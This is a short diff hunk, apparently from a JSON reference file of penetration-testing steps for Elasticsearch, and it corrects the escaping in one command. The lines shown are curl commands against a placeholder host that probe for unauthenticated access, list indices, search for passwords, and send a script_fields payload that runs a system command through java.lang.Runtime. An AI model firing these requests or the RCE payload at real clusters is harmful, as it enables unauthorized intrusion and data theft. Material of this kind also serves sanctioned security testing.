@@ -959,7 +959,7 @@
                     "Check for unauthenticated access: `curl http://target.com:9200/`",
                     "List all indices: `curl http://target.com:9200/_cat/indices`",
                     "Query sensitive data: `curl http://target.com:9200/_search?q=password`",
-                    "Check for RCE via scripts: `curl -X POST \"http://target.com:9200/_search\" -d '{\"script_fields\": {\"exploit\": {\"script\": \"java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"id\\").getText()\"}}}' -H 'Content-Type: application/json'`",
+                    "Check for RCE via scripts: `curl -X POST \"http://target.com:9200/_search\" -d '{\"script_fields\": {\"exploit\": {\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}' -H 'Content-Type: application/json'`",
                     "Look for cluster information: `curl http://target.com:9200/_cluster/health`"
                 ],
                 "tools": [
